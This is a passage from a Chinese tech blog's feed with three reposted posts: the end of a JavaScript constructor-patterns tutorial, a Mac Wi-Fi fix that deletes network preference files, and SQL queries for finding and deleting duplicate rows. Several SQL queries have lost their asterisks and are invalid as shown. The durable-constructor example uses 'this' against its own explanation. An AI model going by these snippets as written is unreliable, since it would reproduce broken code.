&nbsp; &nbsp;<span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">return</span> <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">this</span>.join(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">&nbsp; &nbsp;//返回数组</span><br> <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">&nbsp; &nbsp;return</span> values;<br> }<br><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">var</span> colors = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> SpecialArray(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“red”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“blue”</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“green”</span>);<br>console.log(colors.toPipedString());<span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">//red|blue|green</span></span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style="color: rgb(0, 128, 255);">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style="color: rgb(0, 128, 255);">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style="color: rgb(0, 128, 255);">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style="color: rgb(0, 128, 255);">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style="color: rgb(0, 128, 255);">toPipedString()</span>方法。</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(247, 92, 47);"><strong>七、稳妥构造函数模式</strong></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);"><br></span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style="color: rgb(247, 92, 47);"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style="color: rgb(0, 128, 255);">Person</span>构造函数重写如下：</span></p><pre class="" name="code" style=" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span> <span class="" style="box-sizing: border-box;">Person</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">(name, age, job)</span>{</span><span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">new</span> <span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">Object</span>(); <br> &nbsp;<br><span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;"> &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;//添加方法</span><br>&nbsp; &nbsp;o.sayName = <span class="" style="box-sizing: border-box;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">function</span><span class="" style="color: rgb(102, 0, 102); box-sizing: border-box;">()</span>{</span>&nbsp;<br>&nbsp; &nbsp; &nbsp;&nbsp;alert(<span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; &nbsp;}; &nbsp; &nbsp;<br><br> &nbsp; &nbsp;<span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">//返回对象</span><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;"><br>&nbsp; &nbsp;return</span> o;<br> &nbsp; &nbsp;}</span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用<span style="color: rgb(0, 128, 255);">sayName()</span>方法之外，没有其他办法访问<span style="color: rgb(0, 128, 255);">name</span>的值。可以像下面使用稳妥的<span style="color: rgb(0, 128, 255);">Person</span>构造函数：</span></p><pre class="" name="code" style=" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; "><code class="" style=" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; "><span style="font-size: 14px;"><span class="" style="color: rgb(0, 0, 136); box-sizing: border-box;">var</span> person =Person(<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“weiqi”</span>,<span class="" style="color: rgb(0, 102, 102); box-sizing: border-box;">22</span>,<span class="" style="color: rgb(0, 136, 0); box-sizing: border-box;">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class="" style="color: rgb(136, 0, 0); box-sizing: border-box;">//weiqi</span></span></code></pre><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量<span style="color: rgb(0, 128, 255);">person</span>中保存的是一个稳妥对象，而除了<span style="color: rgb(0, 128, 255);">sayName()</span>方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;</span></p><p style="line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;"><span style="color: rgb(136, 136, 136);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: rgb(247, 92, 47);"><strong>注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。</strong></span></span></p></section></section></section></p>
<blockquote>
<p>转自：<a href="http://blog.csdn.net/u014346301/article/details/52204967" target="_blank" rel="external">http://blog.csdn.net/u014346301/article/details/52204967</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;section class=&quot;&quot; data-tools=&quot;135编辑器&quot; data-id=&quot;87859&quot; style=&quot;   box-sizing: border-box; &quot;&gt;&lt;p style=&quot;line-height: 1.75em; text-align: just
    
    </summary>
    
      <category term="Web" scheme="http://blog.yfgeek.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Mac Wi-Fi掉线解决方案</title>
    <link href="http://blog.yfgeek.com/2016/10/09/Mac-Wi-Fi-%E6%8E%89%E7%BA%BF%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88-1/"/>
    <id>http://blog.yfgeek.com/2016/10/09/Mac-Wi-Fi-掉线解决方案-1/</id>
    <published>2016-10-09T14:07:52.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。</p>
<p>分享解决方案：</p>
<p>进入目录<code>/Library/Preferences/SystemConfiguration</code></p>
<p>删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">com.apple.airport.preferences.plist</div><div class="line">com.apple.network.identification.plist</div><div class="line">com.apple.wifi.message-tracer.plist</div><div class="line">NetworkInterfaces.plist</div><div class="line">preferences.plist</div></pre></td></tr></table></figure>
<p>重启</p>
<p>解决问题。</p>
<p>转载自：<a href="http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html" target="_blank" rel="external">http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。&lt;/p&gt;
&lt;p&gt;分享解决方案：&lt;/p&gt;
&lt;p&gt;进入目录&lt;code&gt;/Library/Preferences/SystemConfiguration&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;删除&lt;/p&gt;
&lt;figure cl
    
    </summary>
    
      <category term="Mac" scheme="http://blog.yfgeek.com/categories/Mac/"/>
    
    
      <category term="Mac" scheme="http://blog.yfgeek.com/tags/Mac/"/>
    
  </entry>
  
  <entry>
    <title>SQL重复记录查询（转载）</title>
    <link href="http://blog.yfgeek.com/2016/10/05/SQL%E9%87%8D%E5%A4%8D%E8%AE%B0%E5%BD%95%E6%9F%A5%E8%AF%A2%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/"/>
    <id>http://blog.yfgeek.com/2016/10/05/SQL重复记录查询（转载）/</id>
    <published>2016-10-05T18:34:04.000Z</published>
    <updated>2016-11-19T11:35:18.000Z</updated>
    
    <content type="html"><![CDATA[<div id="cnblogs_post_body"><div><span style="font-weight: bold; color: #800000"><font face="Courier New">&nbsp;1</font></span><font face="Courier New"><span style="color: #000000">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"><em></em></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;people<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;peopleId&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(peopleId)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)</span></font></div><br><div><font face="Courier New"><span style="color: #000000">&nbsp;例二：</span></font></div><br><div><font face="Courier New"><span style="color: #000000"><font color="#0000ff">&nbsp;select</font>  <font color="#0000ff">from</font> testtable</span></font></div><br><div><font face="Courier New"><span style="color: #000000"><font color="#0000ff">&nbsp;where</font> numeber in (<font color="#0000ff">select</font> number <font color="#0000ff">from</font> people <font color="#0000ff">group by</font> number <font color="#0000ff">having count</font>(number) &gt; 1 )</span></font></div><br><div><font face="Courier New"><span style="color: #000000">&nbsp;可以查出testtable表中number相同的记录<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="font-weight: bold; color: #800000">2</span></font><font face="Courier New"><span style="color: #000000">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">delete</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;people&nbsp;<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;peopleId&nbsp;&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;people&nbsp;&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(peopleId)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #808080">and</span><span style="color: #000000">&nbsp;rowid&nbsp;</span><span style="color: #808080">not</span><span style="color: #000000">&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">min</span><span style="color: #000000">(rowid)&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;peopleId&nbsp;&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(peopleId&nbsp;)</span><span style="color: #808080">&gt;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="font-weight: bold; color: #800000">3</span></font><font face="Courier New"><span style="color: #000000">、查找表中多余的重复记录（多个字段）&nbsp;<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"><em></em></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;vitae&nbsp;a<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;vitae&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"></span><span style="color: #000000">)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="font-weight: bold; color: #800000">4</span></font><font face="Courier New"><span style="color: #000000">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">delete</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;vitae&nbsp;a<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;vitae&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"><em></em></span><span style="color: #000000">)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #808080">and</span><span style="color: #000000">&nbsp;rowid&nbsp;</span><span style="color: #808080">not</span><span style="color: #000000">&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">min</span><span style="color: #000000">(rowid)&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;vitae&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"></span><span style="color: #000000">)</span><span style="color: #808080">&gt;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="font-weight: bold; color: #800000">5</span></font><font face="Courier New"><span style="color: #000000">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #808080"><em></em></span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">from</span></font><font face="Courier New"><span style="color: #000000">&nbsp;vitae&nbsp;a<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">where</span><span style="color: #000000">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;vitae&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"></span><span style="color: #000000">)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #808080">and</span><span style="color: #000000">&nbsp;rowid&nbsp;</span><span style="color: #808080">not</span><span style="color: #000000">&nbsp;</span><span style="color: #808080">in</span><span style="color: #000000">&nbsp;(</span><span style="color: #0000ff">select</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">min</span><span style="color: #000000">(rowid)&nbsp;</span><span style="color: #0000ff">from</span><span style="color: #000000">&nbsp;vitae&nbsp;</span><span style="color: #0000ff">group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">by</span><span style="color: #000000">&nbsp;peopleId,seq&nbsp;</span><span style="color: #0000ff">having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">count</span><span style="color: #000000">(</span><span style="color: #808080"><em></em></span><span style="color: #000000">)</span><span style="color: #808080">&gt;</span><span style="font-weight: bold; color: #800000">1</span></font><font face="Courier New"><span style="color: #000000">)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">(二)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">比方说<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">在A表中存在一个字段“name”，<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></span><span style="color: #0000ff">Select</span><span style="color: #000000">&nbsp;Name,</span><span style="color: #ff00ff">Count</span><span style="color: #000000">(</span><span style="color: #808080"></span><span style="color: #000000">)&nbsp;</span><span style="color: #0000ff">From</span><span style="color: #000000">&nbsp;A&nbsp;</span><span style="color: #0000ff">Group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">By</span><span style="color: #000000">&nbsp;Name&nbsp;</span><span style="color: #0000ff">Having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">Count</span><span style="color: #000000">(</span><span style="color: #808080"><em></em></span><span style="color: #000000">)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">如果还查性别也相同大则如下:<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"></font></span><font face="Courier New"><span style="color: #0000ff">Select</span><span style="color: #000000">&nbsp;Name,sex,</span><span style="color: #ff00ff">Count</span><span style="color: #000000">(</span><span style="color: #808080"></span><span style="color: #000000">)&nbsp;</span><span style="color: #0000ff">From</span><span style="color: #000000">&nbsp;A&nbsp;</span><span style="color: #0000ff">Group</span><span style="color: #000000">&nbsp;</span><span style="color: #0000ff">By</span><span style="color: #000000">&nbsp;Name,sex&nbsp;</span><span style="color: #0000ff">Having</span><span style="color: #000000">&nbsp;</span><span style="color: #ff00ff">Count</span><span style="color: #000000">(</span><span style="color: #808080"><em></em></span><span style="color: #000000">)&nbsp;</span><span style="color: #808080">&gt;</span><span style="color: #000000">&nbsp;</span><span style="font-weight: bold; color: #800000">1</span></font><span style="color: #000000"><br><br><font face="Courier New"><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">(三)<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top">方法一<br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" align="top"><br><br><img onclick="window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)" alt="" src="http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif" 